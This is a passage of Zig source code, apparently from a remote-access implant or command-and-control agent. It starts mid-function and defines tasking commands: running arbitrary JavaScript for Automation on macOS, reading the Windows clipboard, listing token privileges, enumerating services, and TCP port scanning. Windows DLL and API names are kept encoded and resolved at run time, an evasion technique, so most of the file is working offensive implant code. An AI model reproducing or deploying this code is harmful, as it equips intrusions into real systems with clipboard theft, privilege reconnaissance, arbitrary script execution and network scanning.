    child.stdin_behavior  = .Close;
    child.spawn() catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "launchctl: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    if (comptime builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }
    const stdout = child.stdout.?.reader().readAllAlloc(allocator, 4 * 1024 * 1024) catch try allocator.dupe(u8, "");
    _ = child.stderr.?.reader().readAllAlloc(allocator, 64 * 1024) catch {};
    _ = child.wait() catch {};
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// osascript — execute JavaScript for Automation (macOS only)
// ---------------------------------------------------------------------------

pub fn osascript(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_osascript) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .macos) {
        const msg = try allocator.dupe(u8, "osascript: only supported on macOS");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    const P = struct { code: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "osascript: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    const argv = [_][]const u8{ "osascript", "-l", "JavaScript", "-e", parsed.value.code };
    var child = std.process.Child.init(&argv, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.stdin_behavior  = .Close;
    child.spawn() catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "osascript: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    if (comptime builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }
    const stdout = child.stdout.?.reader().readAllAlloc(allocator, 4 * 1024 * 1024) catch try allocator.dupe(u8, "");
    const stderr = child.stderr.?.reader().readAllAlloc(allocator, 1 * 1024 * 1024) catch try allocator.dupe(u8, "");
    _ = child.wait() catch {};

    if (stdout.len == 0 and stderr.len > 0) {
        allocator.free(stdout);
        return .{ .output = stderr, .is_error = false, .allocator = allocator };
    }
    allocator.free(stderr);
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// clipboard — read Windows clipboard (Windows only)
// ---------------------------------------------------------------------------

pub fn clipboard(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_clipboard) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .windows) {
        const msg = try allocator.dupe(u8, "clipboard: only supported on Windows");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    if (comptime builtin.os.tag == .windows) {
        const CF_UNICODETEXT: c_uint = 13;

        var dll = ob.decSz(ob.e_dll_user32);
        const hU32 = WinLoader.LoadLibraryA(@ptrCast(&dll)) orelse {
            const msg = try allocator.dupe(u8, "clipboard: LoadLibrary user32 failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };

        var n1 = ob.decSz(ob.e_fn_OpenClipboard);
        const fnOpen: *const fn (?*anyopaque) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hU32, @ptrCast(&n1)) orelse {
                const msg = try allocator.dupe(u8, "clipboard: resolve OpenClipboard failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n2 = ob.decSz(ob.e_fn_GetClipboardData);
        const fnGetData: *const fn (c_uint) callconv(.Win64) ?*anyopaque =
            @ptrCast(WinLoader.GetProcAddress(hU32, @ptrCast(&n2)) orelse {
                const msg = try allocator.dupe(u8, "clipboard: resolve GetClipboardData failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n3 = ob.decSz(ob.e_fn_CloseClipboard);
        const fnClose: *const fn () callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hU32, @ptrCast(&n3)) orelse {
                const msg = try allocator.dupe(u8, "clipboard: resolve CloseClipboard failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        if (fnOpen(null) == 0) {
            const msg = try allocator.dupe(u8, "clipboard: OpenClipboard failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        }
        defer _ = fnClose();

        const h = fnGetData(CF_UNICODETEXT) orelse {
            const msg = try allocator.dupe(u8, "clipboard: no text data");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
        const ptr = WinLoader.GlobalLock(h) orelse {
            const msg = try allocator.dupe(u8, "clipboard: GlobalLock failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
        defer _ = WinLoader.GlobalUnlock(h);

        const wide: [*:0]const u16 = @ptrCast(@alignCast(ptr));
        const utf8 = try std.unicode.utf16LeToUtf8Alloc(allocator, std.mem.span(wide));
        return .{ .output = utf8, .is_error = false, .allocator = allocator };
    }

    unreachable;
}

// ---------------------------------------------------------------------------
// getprivs — enumerate process token privileges (Windows only)
// ---------------------------------------------------------------------------

pub fn getprivs(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_getprivs) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .windows) {
        const msg = try allocator.dupe(u8, "getprivs: only supported on Windows");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    if (comptime builtin.os.tag == .windows) {
        const TOKEN_QUERY: u32 = 0x0008;
        const TokenPrivileges: c_int = 3;
        const SE_PRIVILEGE_ENABLED: u32 = 0x00000002;

        var dll = ob.decSz(ob.e_dll_advapi32);
        const hAdv = WinLoader.LoadLibraryA(@ptrCast(&dll)) orelse {
            const msg = try allocator.dupe(u8, "getprivs: LoadLibrary advapi32 failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };

        var n1 = ob.decSz(ob.e_fn_OpenProcessToken);
        const fnOpenToken: *const fn (?*anyopaque, u32, **anyopaque) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n1)) orelse {
                const msg = try allocator.dupe(u8, "getprivs: resolve OpenProcessToken failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n2 = ob.decSz(ob.e_fn_GetTokenInformation);
        const fnGetTokenInfo: *const fn (*anyopaque, c_int, ?*anyopaque, u32, *u32) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n2)) orelse {
                const msg = try allocator.dupe(u8, "getprivs: resolve GetTokenInformation failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n3 = ob.decSz(ob.e_fn_LookupPrivilegeNameW);
        const fnLookupPriv: *const fn (?*anyopaque, *anyopaque, [*]u16, *u32) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n3)) orelse {
                const msg = try allocator.dupe(u8, "getprivs: resolve LookupPrivilegeNameW failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var token: *anyopaque = undefined;
        if (fnOpenToken(WinLoader.GetCurrentProcess(), TOKEN_QUERY, &token) == 0) {
            const msg = try allocator.dupe(u8, "getprivs: OpenProcessToken failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        }
        defer _ = WinLoader.CloseHandle(token);

        var needed: u32 = 0;
        _ = fnGetTokenInfo(token, TokenPrivileges, null, 0, &needed);
        const priv_buf = try allocator.alloc(u8, needed);
        defer allocator.free(priv_buf);

        if (fnGetTokenInfo(token, TokenPrivileges, priv_buf.ptr, needed, &needed) == 0) {
            const msg = try allocator.dupe(u8, "getprivs: GetTokenInformation failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        }

        const count: u32 = std.mem.readInt(u32, priv_buf[0..4], .little);
        var buf = std.ArrayList(u8).init(allocator);
        errdefer buf.deinit();
        try buf.appendSlice("Privilege                              State\n");

        var i: u32 = 0;
        while (i < count) : (i += 1) {
            // LUID_AND_ATTRIBUTES: LUID(8) + Attributes(4) = 12 bytes each
            const offset = 4 + i * 12;
            if (offset + 12 > priv_buf.len) break;
            const luid_ptr = priv_buf[offset..][0..8];
            const attrs = std.mem.readInt(u32, priv_buf[offset + 8..][0..4], .little);

            var name_buf: [256]u16 = undefined;
            var name_len: u32 = name_buf.len;
            if (fnLookupPriv(null, luid_ptr.ptr, &name_buf, &name_len) != 0) {
                const name_utf8 = std.unicode.utf16LeToUtf8Alloc(allocator, name_buf[0..name_len]) catch continue;
                defer allocator.free(name_utf8);
                const state = if (attrs & SE_PRIVILEGE_ENABLED != 0) "Enabled" else "Disabled";
                try buf.writer().print("{s:<38} {s}\n", .{ name_utf8, state });
            }
        }

        return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
    }

    unreachable;
}

// ---------------------------------------------------------------------------
// services — enumerate Win32 services (Windows only)
// ---------------------------------------------------------------------------

pub fn services(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_services) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .windows) {
        const msg = try allocator.dupe(u8, "services: only supported on Windows");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    if (comptime builtin.os.tag == .windows) {
        const SC_MANAGER_ENUMERATE_SERVICE: u32 = 0x0004;
        const SERVICE_WIN32: u32 = 0x0030;
        const SERVICE_STATE_ALL: u32 = 0x0003;
        const SC_ENUM_PROCESS_INFO: c_int = 0;

        var dll = ob.decSz(ob.e_dll_advapi32);
        const hAdv = WinLoader.LoadLibraryA(@ptrCast(&dll)) orelse {
            const msg = try allocator.dupe(u8, "services: LoadLibrary advapi32 failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };

        var n1 = ob.decSz(ob.e_fn_OpenSCManagerW);
        const fnOpenSCM: *const fn (?*anyopaque, ?*anyopaque, u32) callconv(.Win64) ?*anyopaque =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n1)) orelse {
                const msg = try allocator.dupe(u8, "services: resolve OpenSCManagerW failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n2 = ob.decSz(ob.e_fn_EnumSvcStatusExW);
        const fnEnumSvc: *const fn (*anyopaque, c_int, u32, u32, ?*anyopaque, u32, *u32, *u32, *u32, ?*anyopaque) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n2)) orelse {
                const msg = try allocator.dupe(u8, "services: resolve EnumServicesStatusExW failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        var n3 = ob.decSz(ob.e_fn_CloseServiceHandle);
        const fnCloseSvc: *const fn (*anyopaque) callconv(.Win64) c_int =
            @ptrCast(WinLoader.GetProcAddress(hAdv, @ptrCast(&n3)) orelse {
                const msg = try allocator.dupe(u8, "services: resolve CloseServiceHandle failed");
                return .{ .output = msg, .is_error = true, .allocator = allocator };
            });

        const scm = fnOpenSCM(null, null, SC_MANAGER_ENUMERATE_SERVICE) orelse {
            const msg = try allocator.dupe(u8, "services: OpenSCManager failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
        defer _ = fnCloseSvc(scm);

        var needed: u32 = 0;
        var returned: u32 = 0;
        var resume_handle: u32 = 0;
        _ = fnEnumSvc(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, null, 0, &needed, &returned, &resume_handle, null);

        const svc_buf = try allocator.alloc(u8, needed);
        defer allocator.free(svc_buf);
        resume_handle = 0;

        if (fnEnumSvc(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, svc_buf.ptr, needed, &needed, &returned, &resume_handle, null) == 0) {
            const msg = try allocator.dupe(u8, "services: EnumServicesStatusEx failed");
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        }

        var buf = std.ArrayList(u8).init(allocator);
        errdefer buf.deinit();
        try buf.appendSlice("NAME                             STATE      PID\n");

        var i: u32 = 0;
        const entry_size = 68; // sizeof(ENUM_SERVICE_STATUS_PROCESSW) on x64
        while (i < returned) : (i += 1) {
            const offset = i * entry_size;
            if (offset + entry_size > svc_buf.len) break;
            const name_ptr: usize = std.mem.readInt(usize, svc_buf[offset..][0..8], .little);
            const state_offset = 16 + 4;
            const pid_offset   = 16 + 28;
            if (offset + 16 + 32 > svc_buf.len) break;
            const state = std.mem.readInt(u32, svc_buf[offset + state_offset..][0..4], .little);
            const pid   = std.mem.readInt(u32, svc_buf[offset + pid_offset..][0..4], .little);
            const state_str = switch (state) {
                1 => "STOPPED",   2 => "START_PENDING", 3 => "STOP_PENDING",
                4 => "RUNNING",   5 => "CONTINUE_PENDING", 6 => "PAUSE_PENDING",
                7 => "PAUSED",    else => "UNKNOWN",
            };
            const name_rel = name_ptr -% @intFromPtr(svc_buf.ptr);
            if (name_rel < svc_buf.len) {
                const wide: [*:0]const u16 = @ptrCast(@alignCast(svc_buf[name_rel..].ptr));
                const name_utf8 = std.unicode.utf16LeToUtf8Alloc(allocator, std.mem.span(wide)) catch continue;
                defer allocator.free(name_utf8);
                try buf.writer().print("{s:<32} {s:<10} {d}\n", .{ name_utf8, state_str, pid });
            }
        }

        return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
    }

    unreachable;
}

// ---------------------------------------------------------------------------
// portscan — TCP connect scan (background job)
// ---------------------------------------------------------------------------

pub fn portscan(
    allocator: std.mem.Allocator,
    params_json: []const u8,
    cancel: *std.atomic.Value(bool),
) !Result {
    if (comptime !config.include_portscan) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct {
        hosts: []const []const u8 = &[_][]const u8{},
        ports: []const u16 = &[_]u16{},
        timeout_ms: u64 = 1000,
    };
    const parsed = try std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true });
    defer parsed.deinit();

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();
    try buf.appendSlice("Host                   Port   State\n");

    for (parsed.value.hosts) |host| {
        for (parsed.value.ports) |port| {
            if (cancel.load(.acquire)) break;
            const stream = std.net.tcpConnectToHost(allocator, host, port);
            if (stream) |s| {
                s.close();
                try buf.writer().print("{s:<22} {d:<6} open\n", .{ host, port });
            } else |_| {}
        }
        if (cancel.load(.acquire)) break;
    }

    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}
